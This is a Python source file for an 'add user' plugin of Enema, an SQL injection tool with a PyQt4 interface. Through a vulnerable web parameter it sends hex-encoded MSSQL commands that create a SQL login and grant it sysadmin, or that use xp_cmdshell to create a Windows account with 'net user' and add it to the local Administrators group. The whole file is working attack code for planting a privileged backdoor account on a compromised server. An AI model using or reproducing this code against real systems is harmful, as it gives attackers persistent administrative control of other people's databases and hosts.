"""
    Enema plugin (mssql): Add sql/windows user
    Copyright (C) 2011 Valeriy Bogachuk
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import os
import core.txtproc
from core.e_const import CONFIG_PATH
from core.http import HTTP_Handler
from PyQt4 import QtCore, QtGui

from gui.mssql.add_user.Ui_add_user import Ui_addUserWidget

PLUGIN_NAME = "ADD_USER"

class AddUserWidget(QtGui.QWidget):
    
    logSignal = QtCore.pyqtSignal(str)
     
    def __init__(self, vars, qstring, parent=None):
        QtGui.QWidget.__init__(self, parent, QtCore.Qt.Tool)
        self.ui = Ui_addUserWidget()
        self.ui.setupUi(self)
        self.setWindowModality(QtCore.Qt.ApplicationModal)
        self.vars = vars
        self.qstring = core.txtproc.correctQstr(qstring)
        self.ui.progressBar.hide()
        
        self.ui.addUserButton.clicked.connect(self.addUserButton_OnClick)
                
        #Load config
        if os.path.exists(CONFIG_PATH):
            settings = QtCore.QSettings(CONFIG_PATH, QtCore.QSettings.IniFormat)
            self.ui.lineUsername.setText(settings.value('ADD_USER/username', ''))
            self.ui.linePassword.setText(settings.value('ADD_USER/password', ''))
            self.move(settings.value("Main/window_position"))
        #---
        
    def emitLog(self, logStr):
        self.logSignal.emit(logStr)
    
    #Hidding progressbar when task is done
    def taskDone(self):
        self.ui.progressBar.hide()
 
#Is program busy at this moment
    def isBusy(self):
        try:
            if self.worker.isRunning():
                return True
        except AttributeError:
            return False
            
    #FTP Upload button click        
    def addUserButton_OnClick(self):
        if self.isBusy():
            return
        #Adding variables from plugin widget
        self.vars['username'] = self.ui.lineUsername.text()
        self.vars['password'] = self.ui.linePassword.text()
        if self.ui.radioSql.isChecked():
            self.vars['type'] = 'sql'
        else:
            self.vars['type'] = 'win'
        #---
        self.ui.progressBar.show()
        self.worker = Worker(self.vars, self.qstring)
        #Signal connects
        self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.QueuedConnection)
        self.worker.taskDoneSignal.connect(self.taskDone, type=QtCore.Qt.QueuedConnection)
        #---
        self.worker.start()
        
    #When widget closing
    def closeEvent(self, event):
        #Saving settings
        settings = QtCore.QSettings("settings/enema.ini", QtCore.QSettings.IniFormat)
        settings.setValue('ADD_USER/username', self.ui.lineUsername.text())
        settings.setValue('ADD_USER/password', self.ui.linePassword.text())
        settings.sync()

    
class Worker(QtCore.QThread):

    taskDoneSignal = QtCore.pyqtSignal()
    logSignal = QtCore.pyqtSignal(str)
        
    def __init__(self, vars, qstring):
        QtCore.QThread.__init__(self)
        self.vars = vars
        self.qstring = qstring
        self.wq = HTTP_Handler()
        self.wq.logSignal.connect(self.log)
        
    def log(self, logStr):
        self.logSignal.emit(logStr)
            
    def run(self):
        self.logSignal.emit("+++ [" + PLUGIN_NAME + "]: TASK STARTED +++")
        #--------Task----------
        self.addUserTask()
        #-----------------------
        self.taskDoneSignal.emit()
        self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")
        
    def addUserTask(self):
        if self.vars['type'] == "sql":
            #Adding sql user
            hex = core.txtproc.strToHex("master..sp_addlogin '" + self.vars['username']\
            + "','" + self.vars['password'] + "'", True)
            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
            self.wq.httpRequest(query, True, self.vars)
            
            #Adding 'sysadmin' rights for our user
            hex = core.txtproc.strToHex("master..sp_addsrvrolemember '" + self.vars['username']\
            + "','sysadmin'", True)
            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
            self.wq.httpRequest(query, True, self.vars)
        else:
            #Adding windows user
            hex = core.txtproc.strToHex("master..xp_cmdshell 'net user " + self.vars['username']\
            + " " + self.vars['password'] + " /ADD'", True)
            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
            self.wq.httpRequest(query, True, self.vars)
            
            #Adding windows user to local group 'Administrators'
            hex = core.txtproc.strToHex("master..xp_cmdshell 'net localgroup Administrators "\
            + self.vars['username'] + " /ADD'", True)
            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
            self.wq.httpRequest(query, True, self.vars)
